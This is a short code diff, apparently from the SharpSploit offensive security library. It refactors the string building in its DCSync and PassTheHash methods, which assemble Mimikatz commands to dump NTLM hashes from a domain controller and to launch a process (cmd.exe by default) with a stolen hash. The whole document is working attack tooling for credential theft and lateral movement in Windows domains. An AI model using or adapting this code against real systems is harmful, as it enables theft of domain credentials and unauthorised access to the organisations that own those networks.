@@ -156,7 +156,8 @@ namespace SharpSploit.Credentials
         /// <returns>The NTLM hash of the target user(s).</returns>
         public static string DCSync(string user, string FQDN = null, string DC = null)
         {
-            string command = "\"lsadump::dcsync";
+            string command = "\"";
+            command += "lsadump::dcsync";
             if (user.ToLower() == "all")
             {
                 command += " /all";
@@ -165,7 +166,7 @@ namespace SharpSploit.Credentials
             {
                 command += " /user:" + user;
             }
-            if (FQDN != null)
+            if (FQDN != null && FQDN != "")
             {
                 command += " /domain:" + FQDN;
             }
@@ -173,14 +174,12 @@ namespace SharpSploit.Credentials
             {
                 command += " /domain:" + IPGlobalProperties.GetIPGlobalProperties().DomainName;
             }
-            if (DC != null)
+            if (DC != null && DC != "")
             {
-                command += " /dc:" + DC + "\"";
+                command += " /dc:" + DC;
             }
-            else
-            {
-                command += "\"";
-            }
+            command += "\"";
+
             return Command(command);
         }
 
@@ -195,9 +194,10 @@ namespace SharpSploit.Credentials
         /// <returns></returns>
         public static string PassTheHash(string user, string NTLM, string FQDN = null, string run = "cmd.exe")
         {
-            string command = "\"sekurlsa::pth";
+            string command = "\"";
+            command += "sekurlsa::pth";
             command += " /user:" + user;
-            if (FQDN != null)
+            if (FQDN != null && FQDN != "")
             {
                 command += " /domain:" + FQDN;
             }
@@ -206,7 +206,8 @@ namespace SharpSploit.Credentials
                 command += " /domain:" + IPGlobalProperties.GetIPGlobalProperties().DomainName;
             }
             command += " /ntlm:" + NTLM;
-            command += " /run:" + run + "\"";
+            command += " /run:" + run;
+            command += "\"";
             return Command(command);
         }
     }
